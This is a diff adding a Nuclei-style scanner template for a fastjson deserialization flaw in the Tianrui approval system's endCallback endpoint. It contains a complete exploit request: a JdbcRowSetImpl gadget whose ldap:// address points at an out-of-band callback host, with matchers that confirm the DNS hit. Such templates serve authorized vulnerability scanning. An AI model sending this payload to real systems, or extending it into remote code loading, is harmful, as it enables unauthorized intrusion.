@@ -1,0 +1,50 @@
+id: poc-yaml-tipray-gsas-endcallback-fastjson-deserialization
+
+info:
+  name: Tianrui Approval System endCallback Fastjson Deserialization
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,oast,dns
+  description: |
+    Tianrui Green Shield Approval System endCallback endpoint is vulnerable to a fastjson deserialization attack, which can lead to arbitrary code execution via DNS callbacks.
+
+variables:
+  random: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/ws/taskCommon/endCallback HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+            "workflowInstanceId": "any-non-empty-string",
+            "approval": "true",
+            "data": [
+                {
+                    "@type": "com.sun.rowset.JdbcRowSetImpl",
+                    "dataSourceName": "ldap://{{interactsh-url}}/{{random}}",
+                    "autoCommit": true
+                }
+            ]
+        }
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: word
+        part: body
+        words:
+          - "Internal Server Error"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
